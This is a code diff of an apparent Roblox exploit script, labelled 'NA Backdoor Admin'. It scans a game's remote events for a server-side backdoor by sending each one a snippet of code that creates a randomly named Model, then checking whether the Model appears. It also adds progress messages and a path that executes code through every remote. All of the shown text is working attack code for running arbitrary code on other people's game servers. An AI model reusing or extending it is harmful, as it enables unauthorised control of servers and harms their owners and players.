@@ -300,13 +300,33 @@ local function FZAXI_fake_script()
                 end
             end
 
-            for _, b in pairs(RemoteList) do
-                if AcquiredRemote == nil then
-                    local NeededName = ""
-                    for _ = 1, 64 do
-                        NeededName = NeededName .. string.char(math.random(65, 90))
-                    end
-                    local NeededCode = 'Instance.new("Model", workspace).Name = "' .. NeededName .. '"'
+            for a,b in pairs(RemoteList) do
+                if AcquiredRemote == nil then 
+                    print("NA Backdoor Admin // Checking Backdoor RemoteEvent.. "..b.ClassName..' "'..b.Name..'".') 
+                    local NeededNameOfModel = string.char(
+                        math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),
+                        math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),
+                        math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),
+                        math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),
+                        math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),
+                        math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),
+                        math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),
+                        math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),
+                        math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),
+                        math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),
+                        math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),
+                        math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),
+                        math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),
+                        math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),
+                        math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),
+                        math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),
+                        math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),
+                        math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),
+                        math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),
+                        math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),
+                        math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A)
+                    )
+                    local NeededCode = 'Instance.new("Model", workspace).Name = "' .. NeededNameOfModel .. '"'
 
                     CurrentRemote = b
                     if b:IsA("RemoteEvent") then
@@ -317,9 +337,10 @@ local function FZAXI_fake_script()
 
                     wait(2.5)
 
-                    local created = workspace:FindFirstChild(NeededName)
+                    local created = workspace:FindFirstChild(NeededNameOfModel)
                     if created and created:IsA("Model") then
                         AcquiredRemote = b
+                        print("-- NA Backdoor // Founded Backdoor Remote! :): "..b.ClassName..' "'..b.Name..'"')
                     end
                 end
             end
@@ -446,6 +467,7 @@ local function ScriptHubScript()
                 end)
             end
         else
+            -- If not injected, try to execute through all remotes
             local InvokeFunc = Instance.new("BindableEvent")
             InvokeFunc.Event:Connect(function(rfunc, codestr2)
                 task.spawn(function()
